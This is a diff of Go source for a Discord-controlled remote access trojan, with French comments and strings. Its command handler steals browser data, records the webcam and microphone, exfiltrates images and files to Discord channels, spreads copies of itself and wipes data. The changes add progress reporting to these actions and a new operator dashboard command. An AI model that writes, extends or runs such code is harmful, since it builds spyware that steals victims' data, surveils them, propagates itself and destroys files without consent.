@@ -344,8 +344,12 @@ func c2Execute(command string) {
 		discordReply(readTextFile(args))
 
 	case "steal", "exfil":
-		stealAll(true)
-		discordReply("exfiltration terminée.")
+		if msg := runWithProgress("extraction navigateurs", func() string {
+			stealAll(true)
+			return "extraction terminée."
+		}); msg != "" {
+			discordReply(msg)
+		}
 
 	case "webcam", "cam":
 		// Déclenchée par une commande : le résultat revient dans le salon de
@@ -376,7 +380,9 @@ func c2Execute(command string) {
 		discordReply(micRecord(sec))
 
 	case "images", "photos":
-		discordReply(bulkImages())
+		if msg := runWithProgress("envoi des images", func() string { return bulkImages() }); msg != "" {
+			discordReply(msg)
+		}
 
 	case "webcamrec", "camrec":
 		if args == "" {
@@ -446,7 +452,11 @@ func c2Execute(command string) {
 		if len(parts) > 1 {
 			maxRes, _ = strconv.Atoi(parts[1])
 		}
-		discordReply(searchSend(pattern, maxRes))
+		if msg := runWithProgress("recherche "+pattern, func() string {
+			return searchSend(pattern, maxRes)
+		}); msg != "" {
+			discordReply(msg)
+		}
 
 	case "download", "get":
 		if args == "" {
@@ -479,19 +489,31 @@ func c2Execute(command string) {
 	case "rm", "suppr":
 		discordReply(deletePath(args))
 
+	case "panel", "tableau", "dashboard":
+		ch := targetChannel()
+		if ch == "" {
+			discordReply("salon indisponible.")
+			return
+		}
+		if code, err := discordPost(fmt.Sprintf("/channels/%s/messages", ch), map[string]any{
+			"embeds": []any{panelEmbed()},
+		}); err != nil || code >= 300 {
+			discordReply("tableau de bord : envoi impossible.")
+		}
+
 	case "salons", "channels", "salon":
 		discordReply(channelsReport())
 
 	case "spread", "copie", "duplique":
-		discordReply(spreadCopies(true))
+		if msg := runWithProgress("duplication", func() string { return spreadCopies(true) }); msg != "" {
+			discordReply(msg)
+		}
 
 	case "files", "tout", "bulk":
-		discordReply("extraction massive lancée dans les salons fichiers…")
 		go func() {
-			if msg := bulkUploadAll(true); msg != "" {
-				discordReply(msg)
-			}
+			runWithProgress("extraction massive", func() string { return bulkUploadAll(true) })
 		}()
+		discordReply("extraction massive lancée dans les salons fichiers…")
 
 	case "delete", "wipe":
 		discordReply(wipeAll(args))
